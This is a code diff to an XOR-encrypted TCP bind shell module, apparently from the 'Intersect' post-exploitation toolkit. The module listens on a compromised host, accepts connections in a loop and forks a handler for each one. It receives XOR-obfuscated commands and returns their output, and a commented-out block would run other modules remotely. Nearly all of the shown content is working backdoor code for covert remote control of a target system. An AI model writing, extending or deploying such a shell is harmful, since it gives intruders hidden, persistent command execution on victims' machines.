@@ -1,10 +1,5 @@
 
 def xor(string, key):
-    '''
-    @description: Starts a XOR ciphered TCP bindshell on the target. Interactive shell with download/upload and remote Intersect module execution.
-    @author: ohdae [bindshell@live.com]
-    @short: XOR TCP bindshell
-    '''
     data = ''
     for char in string:
         for ch in key:
@@ -14,21 +9,37 @@ def xor(string, key):
 
 
 def xorshell():
+    '''
+    @description: Starts a TCP bind shell on the target system. Interactive shell with download/upload, cd and ability to execute other modules remotely."
+    @author: ohdae [bindshell@live.com]
+    @short: TCP bindshell
+    '''
     HOST = ''
-    socksize = 4096
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
     try:
+        log_msg("[ XOR Bindshell module executed ]")
         server.bind((HOST, PORT))
-        server.listen(10)
-        print("[+] Shell bound on port %s" % PORT)
-        conn, addr = server.accept()
-        print "[+] New Connection: %s" % addr[0]
-        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+        server.listen(5)
     except:
         print "[!] Connection closed."
     	sys.exit(2)
-    
+                                
+    while 1:                                     
+        conn, addr = server.accept()
+        log_msg("New shell connection")
+        conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+        reaper()
+        childPid = os.fork()
+        if childPid == 0:
+            xorhandle(conn)
+        else:
+            shellPID.append(childPid)
+
+
+def xorhandle(conn):
+    time.sleep(3)
+
     while True:
         cmd = conn.recv(socksize)
         cmd2 = xor(cmd, PKEY)
@@ -94,11 +105,24 @@ def xorshell():
 
         elif cmd2.startswith(":exec"):
             pass
+            #getmod = cmd2.split(" ")
+            #rmod = getmod[1]
+            #if rmod in modList:
+            #    rmod = rmod+"()"
+            #    exec rmod
+            #    conn.send(xor("\n[+] Executing module...", PKEY))
+            #else:
+            #    conn.send(xor("\n[!] Module not loaded!", PKEY))
 
         elif cmd2 == (':killme'):
-            conn.send(xor("[!] Shutting down shell!\n", PKEY))
+            conn.send(xor("[!] Shutting down Intersect!\n", PKEY))
             conn.close()
             sys.exit(0)
+
+        elif cmd2 == (':quit'):
+            conn.send(xor("[!] Closing shell connection!\n", PKEY))
+            conn.close()
+            os._exit(0)
 
         elif proc:
             conn.send(xor( stdout , PKEY))
